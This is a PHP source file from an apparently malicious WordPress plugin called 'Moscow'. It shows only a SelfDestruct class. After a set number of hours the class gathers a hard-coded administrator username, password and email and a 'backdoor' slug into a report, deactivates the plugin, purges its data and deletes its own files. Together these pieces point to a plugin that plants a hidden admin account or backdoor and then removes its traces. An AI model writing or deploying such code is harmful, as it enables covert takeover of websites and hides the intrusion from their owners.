<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class SelfDestruct
{
    public function arm(): void
    {
        if (!get_option('moscow_activated_at')) {
            update_option('moscow_activated_at', time());
        }
    }

    public function is_due(): bool
    {
        if (!get_option('moscow_active')) return false;
        $started = (int) get_option('moscow_activated_at', 0);
        if ($started === 0) return false;
        return (time() - $started) >= (Config::SELF_DESTRUCT_HOURS * HOUR_IN_SECONDS);
    }

    public function run(): void
    {
        if (!function_exists('deactivate_plugins')) {
            require_once ABSPATH . 'wp-admin/includes/plugin.php';
        }

        $data = $this->collect_report();

        deactivate_plugins(MOSCOW_BASENAME);

        $cleaner = new Cleaner();
        $cleaner->purge_all();

        $this->render_report($data);

        $cleaner->delete_plugin_files();
        exit;
    }

    private function collect_report(): array
    {
        $started = (int) get_option('moscow_activated_at', 0);
        $elapsed = max(0, time() - $started);

        return [
            'version'    => MOSCOW_VERSION,
            'username'   => Config::ADMIN_USERNAME,
            'password'   => Config::ADMIN_PASSWORD,
            'email'      => Config::ADMIN_EMAIL,
            'backdoor'   => Config::BACKDOOR_SLUG,
            'hours'      => Config::SELF_DESTRUCT_HOURS,
            'elapsed'    => sprintf('%dh %dm', intdiv($elapsed, 3600), intdiv($elapsed % 3600, 60)),
            'site_name'  => get_bloginfo('name'),
            'site_url'   => home_url(),
            'wp_version' => get_bloginfo('version'),
            'php_version'=> PHP_VERSION,
            'admin_id'   => (int) get_option('moscow_admin_id', 0),
        ];
    }

    private function render_report(array $data): void
    {
        extract($data, EXTR_SKIP);
        require MOSCOW_DIR . 'templates/self-destruct-page.php';
        exit;
    }
}